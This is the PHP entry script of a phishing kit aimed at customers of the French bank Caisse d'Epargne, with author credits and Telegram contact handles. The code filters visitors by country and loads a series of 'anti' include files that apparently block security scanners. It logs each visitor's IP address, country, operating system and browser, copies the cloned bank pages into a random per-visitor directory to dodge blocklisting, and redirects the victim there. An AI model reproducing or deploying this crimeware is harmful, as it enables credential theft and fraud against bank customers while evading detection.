<?php

/**
 * @since             15/10/2020
 * @package           Caisse
 * @icq               @@MorrisWorm
 * @telegram          @MorrisWorm22
 *
 * Project Name:      caisse epargne
 * Author:            DIB
 */

include "config.php";
if($countryFilter){
include "@.M/country.filter.php";
}
if($highsecurity){
include '@.M/anti0.php';
include '@.M/anti1.php';
include '@.M/anti2.php';
include '@.M/anti3.php';
include '@.M/anti4.php';
include '@.M/anti5.php';
include '@.M/anti6.php';
include '@.M/anti7.php';
include '@.M/anti8.php';
include '@.M/anti9.php';	
}

include 'inc/app.php';
$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country();
$get_user_countrycode = get_user_countrycode();
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser();
    
$random = rand(0,100000000000);
$DIR    = substr(md5($random), 0, 15);
$dispatch = substr(md5($random), 0, 17);
function recurse_copy($home,$DIR) {
    $dir = opendir($home);
    @mkdir($DIR);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($home . '/' . $file) ) {
                recurse_copy($home . '/' . $file,$DIR . '/' . $file);
            } else {
                copy($home . '/' . $file,$DIR . '/' . $file);
            }
        }
    }
    closedir($dir);
}

$home="dib";
recurse_copy( $home, $DIR );
header("location:$DIR/");
$file = fopen("vu.txt","a");
fwrite($file,$get_user_ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$get_user_country | $get_user_os | $get_user_browser] \n");

?>
    